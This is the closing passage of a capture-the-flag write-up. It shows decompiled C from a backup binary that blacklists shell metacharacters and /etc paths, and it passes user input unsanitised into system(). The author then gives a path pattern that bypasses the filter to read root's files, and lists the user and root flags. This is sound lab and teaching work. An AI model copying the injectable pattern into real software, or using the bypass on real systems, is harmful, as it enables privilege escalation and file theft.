      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( strchr(argv[3], 96) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( strchr(argv[3], 36) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( strchr(argv[3], 124) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( strstr(argv[3], "//") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( !strcmp(argv[3], "/") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( strstr(argv[3], "/etc") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( v24 == 1 )
    displayTarget(argv[3]);
  strcpy(v11, argv[3]);
  v4 = getpid();
  v5 = time(0);
  v6 = clock();
  v7 = mix(v6, v5, v4);
  srand(v7);
  v21 = rand();
  sprintf(v10, "/tmp/.backup_%i", v21);
  sprintf(v9, "/usr/bin/zip -r -P magicword %s %s > /dev/null", v10, v11);
  system(v9);
  if ( access(v10, 0) == -1 )
  {
    if ( v24 == 1 )
      displayWarning("The target path doesn't exist");
  }
  else
  {
    if ( v24 == 1 )
      displaySuccess("Finished! Encoded backup is below:\n");
    sprintf(v9, "/usr/bin/base64 -w0 %s", v10);
    system(v9);
  }
  if ( v24 == 1 )
    puts("\n");
  remove(v10);
  fclose(v22);
  return 0;
}
```

After trying a bit, I found this pattern bypasses these filters “/./_/_.txt”

![Untitled](uploads/Untitled%2019.png)

This time I decrypted it and got the flag

![Untitled](uploads/Untitled%2020.png)

Fetching the flag

![Untitled](uploads/Untitled%2021.png)

Root flag - 314d42bdf31d1c4ee105f022ff13ec70

## Flags

**user.txt -** 442997e53aa18d3b33d77706f6cd087d

**root.txt -** 314d42bdf31d1c4ee105f022ff13ec70
